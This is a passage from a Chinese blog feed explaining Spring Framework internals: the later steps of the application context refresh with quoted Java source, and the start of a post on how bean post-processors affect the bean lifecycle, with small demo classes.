class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>准备一些必要的工具</p><p>如：El表达式，会忽略到实现aware接口,会准备ApplicationContextAwareProcessor</p><h2 id="第四步：postProcessBeanFactory"><a href="#第四步：postProcessBeanFactory" class="headerlink" title="第四步：postProcessBeanFactory"></a>第四步：postProcessBeanFactory</h2><p>留给子类增强</p><h2 id="第五步：invokeBeanFactoryPostProcessors"><a href="#第五步：invokeBeanFactoryPostProcessors" class="headerlink" title="第五步：invokeBeanFactoryPostProcessors"></a>第五步：invokeBeanFactoryPostProcessors</h2><p>执行BeanFactory增强，统一调用 PostProcessorRegistrationDelegate  *装饰器模式，统一处理</p><h2 id="第六步：registerBeanPostProcessors"><a href="#第六步：registerBeanPostProcessors" class="headerlink" title="第六步：registerBeanPostProcessors"></a>第六步：registerBeanPostProcessors</h2><p>注册所有的bean的后置处理器</p><h2 id="第七步：initMessageSource"><a href="#第七步：initMessageSource" class="headerlink" title="第七步：initMessageSource"></a>第七步：initMessageSource</h2><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">initMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory <span class="token operator">=</span> <span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">containsLocalBean</span><span class="token punctuation">(</span><span class="token constant">MESSAGE_SOURCE_BEAN_NAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>messageSource <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token constant">MESSAGE_SOURCE_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token class-name">MessageSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Make MessageSource aware of parent MessageSource.</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>messageSource <span class="token keyword">instanceof</span> <span class="token class-name">HierarchicalMessageSource</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">HierarchicalMessageSource</span> hms <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HierarchicalMessageSource</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>messageSource<span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>hms<span class="token punctuation">.</span><span class="token function">getParentMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// Only set parent context as parent MessageSource if no parent MessageSource</span>            <span class="token comment">// registered already.</span>            hms<span class="token punctuation">.</span><span class="token function">setParentMessageSource</span><span class="token punctuation">(</span><span class="token function">getInternalParentMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Using MessageSource ["</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>messageSource <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Use empty MessageSource to be able to accept getMessage calls.</span>      <span class="token class-name">DelegatingMessageSource</span> dms <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DelegatingMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      dms<span class="token punctuation">.</span><span class="token function">setParentMessageSource</span><span class="token punctuation">(</span><span class="token function">getInternalParentMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>messageSource <span class="token operator">=</span> dms<span class="token punctuation">;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">registerSingleton</span><span class="token punctuation">(</span><span class="token constant">MESSAGE_SOURCE_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>messageSource<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"No '"</span> <span class="token operator">+</span> <span class="token constant">MESSAGE_SOURCE_BEAN_NAME</span> <span class="token operator">+</span> <span class="token string">"' bean, using ["</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>messageSource <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>初始化国际化相关资源,这里没有会创建一个默认的国际化资源</p><h2 id="第八步：initApplicationEventMulticaster"><a href="#第八步：initApplicationEventMulticaster" class="headerlink" title="第八步：initApplicationEventMulticaster"></a>第八步：initApplicationEventMulticaster</h2><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">initApplicationEventMulticaster</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory <span class="token operator">=</span> <span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">containsLocalBean</span><span class="token punctuation">(</span><span class="token constant">APPLICATION_EVENT_MULTICASTER_BEAN_NAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>applicationEventMulticaster <span class="token operator">=</span>            beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token constant">APPLICATION_EVENT_MULTICASTER_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token class-name">ApplicationEventMulticaster</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Using ApplicationEventMulticaster ["</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationEventMulticaster <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>applicationEventMulticaster <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleApplicationEventMulticaster</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">registerSingleton</span><span class="token punctuation">(</span><span class="token constant">APPLICATION_EVENT_MULTICASTER_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationEventMulticaster<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"No '"</span> <span class="token operator">+</span> <span class="token constant">APPLICATION_EVENT_MULTICASTER_BEAN_NAME</span> <span class="token operator">+</span> <span class="token string">"' bean, using "</span> <span class="token operator">+</span>               <span class="token string">"["</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationEventMulticaster<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>初始化事件派发功能</p><h2 id="第九步：onRefresh"><a href="#第九步：onRefresh" class="headerlink" title="第九步：onRefresh"></a>第九步：onRefresh</h2><p>留给子类继续增强</p><h2 id="第十步：registerListeners"><a href="#第十步：registerListeners" class="headerlink" title="第十步：registerListeners"></a>第十步：registerListeners</h2><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">registerListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// Register statically specified listeners first.</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationListener</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> listener <span class="token operator">:</span> <span class="token function">getApplicationListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">getApplicationEventMulticaster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addApplicationListener</span><span class="token punctuation">(</span>listener<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Do not initialize FactoryBeans here: We need to leave all regular beans</span>   <span class="token comment">// uninitialized to let post-processors apply to them!</span>   <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> listenerBeanNames <span class="token operator">=</span> <span class="token function">getBeanNamesForType</span><span class="token punctuation">(</span><span class="token class-name">ApplicationListener</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> listenerBeanName <span class="token operator">:</span> listenerBeanNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">getApplicationEventMulticaster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addApplicationListenerBean</span><span class="token punctuation">(</span>listenerBeanName<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Publish early application events now that we finally have a multicaster...</span>   <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ApplicationEvent</span><span class="token punctuation">></span></span> earlyEventsToProcess <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>earlyApplicationEvents<span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>earlyApplicationEvents <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">CollectionUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>earlyEventsToProcess<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationEvent</span> earlyEvent <span class="token operator">:</span> earlyEventsToProcess<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">getApplicationEventMulticaster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">multicastEvent</span><span class="token punctuation">(</span>earlyEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>注册监听器</p><h2 id="第十一步：finishBeanFactoryInitialization"><a href="#第十一步：finishBeanFactoryInitialization" class="headerlink" title="第十一步：finishBeanFactoryInitialization"></a>第十一步：finishBeanFactoryInitialization</h2><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">finishBeanFactoryInitialization</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// Initialize conversion service for this context.</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">containsBean</span><span class="token punctuation">(</span><span class="token constant">CONVERSION_SERVICE_BEAN_NAME</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>         beanFactory<span class="token punctuation">.</span><span class="token function">isTypeMatch</span><span class="token punctuation">(</span><span class="token constant">CONVERSION_SERVICE_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token class-name">ConversionService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">setConversionService</span><span class="token punctuation">(</span>            beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token constant">CONVERSION_SERVICE_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token class-name">ConversionService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Register a default embedded value resolver if no BeanFactoryPostProcessor</span>   <span class="token comment">// (such as a PropertySourcesPlaceholderConfigurer bean) registered any before:</span>   <span class="token comment">// at this point, primarily for resolution in annotation attribute values.</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>beanFactory<span class="token punctuation">.</span><span class="token function">hasEmbeddedValueResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">addEmbeddedValueResolver</span><span class="token punctuation">(</span>strVal <span class="token operator">-></span> <span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resolvePlaceholders</span><span class="token punctuation">(</span>strVal<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Initialize LoadTimeWeaverAware beans early to allow for registering their transformers early.</span>   <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> weaverAwareNames <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBeanNamesForType</span><span class="token punctuation">(</span><span class="token class-name">LoadTimeWeaverAware</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> weaverAwareName <span class="token operator">:</span> weaverAwareNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">getBean</span><span class="token punctuation">(</span>weaverAwareName<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Stop using the temporary ClassLoader for type matching.</span>   beanFactory<span class="token punctuation">.</span><span class="token function">setTempClassLoader</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Allow for caching all bean definition metadata, not expecting further changes.</span>   beanFactory<span class="token punctuation">.</span><span class="token function">freezeConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Instantiate all remaining (non-lazy-init) singletons.</span>   <span class="token comment">// 初始化所有的单实例bean</span>   beanFactory<span class="token punctuation">.</span><span class="token function">preInstantiateSingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>完成剩下的bean初始化，这里会调用bean的初始化流程，详情参考上一章节，过程中会有不断的BeanPostProcessor对功能增强</p><h2 id="第十二步：finishRefresh"><a href="#第十二步：finishRefresh" class="headerlink" title="第十二步：finishRefresh"></a>第十二步：finishRefresh</h2><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"deprecation"</span><span class="token punctuation">)</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">finishRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// Clear context-level resource caches (such as ASM metadata from scanning).</span>   <span class="token function">clearResourceCaches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Initialize lifecycle processor for this context.</span>   <span class="token function">initLifecycleProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Propagate refresh to lifecycle processor first.</span>   <span class="token function">getLifecycleProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">onRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Publish the final event.</span>   <span class="token function">publishEvent</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ContextRefreshedEvent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Participate in LiveBeansView MBean, if active.</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">NativeDetector</span><span class="token punctuation">.</span><span class="token function">inNativeImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">LiveBeansView</span><span class="token punctuation">.</span><span class="token function">registerApplicationContext</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>一些杂活清理缓存，事件派发等事情</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/%E5%AE%B9%E5%99%A8%E5%88%B7%E6%96%B0%E7%9A%8412%E5%A4%A7%E6%AD%A5.drawio.png" alt="容器刷新的12大步.drawio"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Bean生命周期</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-spring-(五)-Bean初始化流程</title>
    <link href="/posts/7ebc815.html"/>
    <url>/posts/7ebc815.html</url>
    
    <content type="html"><![CDATA[<p> Bean的初始化流程，Spring容器中获取任何一个Bean都是采用getBean的流程，本章节详细了解getBean到底干了什么事，走了什么流程</p><span id="more"></span><p>spring在刷新容器的12大步骤的第11步的时候 finishBeanFactoryInitialization(beanFactory);而 finishBeanFactoryInitialization里面的beanFactory.preInstantiateSingletons();便是入口函数.</p><p>初始化所有非懒加载的Bean(preInstantiateSingletons)</p><h2 id="整体流程分析图"><a href="#整体流程分析图" class="headerlink" title="整体流程分析图"></a>整体流程分析图</h2><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/Bean%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B.drawio.png" alt="Bean初始化流程.drawio"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>容器刷新12大步</tag>
      
      <tag>getBean流程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-spring(四)-后置处理器干预生命周期</title>
    <link href="/posts/5d9cf326.html"/>
    <url>/posts/5d9cf326.html</url>
    
    <content type="html"><![CDATA[<p> 通过源码了解到整个生命周期中，有三种类型的 <strong>生命周期增强器</strong> BeanFactoryPostProcessor（Bean工厂增强），BeanPostProcessor（Bean后置处理器）以及InitializingBean（初始化Bean增强），本章节分析这些增强器是如何干预生命周期的</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>🎉BeanFactoryPostProcessor：后置增强工厂</p><p>🎨BeanPostProcessor: 后置增强组件,实现类很多，在于改变原有对象</p><p>✨InitializingBean： 组件初始化之后进行后续增强，与BeanPostProcessor不用的是，InitializingBean在于额外处理，因为这里不会传入当前对象的任何额外信息</p><p> 实际工作面试中，考察对Spring的了解程度，其本质上是对多少种处理器了解</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>我们这里去实现了许多的PostProcessor，依次打入断点还是源头打入断点调试堆栈信息</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"猫被创建了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyBeanPostProcessor</span> <span class="token keyword">implements</span> <span class="token class-name">BeanPostProcessor</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">MyBeanPostProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MyBeanPostProcessor  构造器执行....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">postProcessBeforeInitialization</span><span class="token punctuation">(</span><span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyBeanPostProcessor.postProcessBeforeInitialization ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> bean<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">postProcessAfterInitialization</span><span class="token punctuation">(</span><span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyBeanPostProcessor.postProcessAfterInitialization ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> bean<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyInitializingBean</span> <span class="token keyword">implements</span> <span class="token class-name">InitializingBean</span> <span class="token punctuation">&#123;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyInitializingBean.afterPropertiesSet ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyInstantiationAwareBeanPostProcessor</span> <span class="token keyword">implements</span> <span class="token class-name">InstantiationAwareBeanPostProcessor</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">MyInstantiationAwareBeanPostProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MyInstantiationAwareBeanPostProcessor  构造器执行....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">postProcessBeforeInstantiation</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> beanClass<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyInstantiationAwareBeanPostProcessor.postProcessBeforeInstantiation ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">postProcessAfterInstantiation</span><span class="token punctuation">(</span><span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token 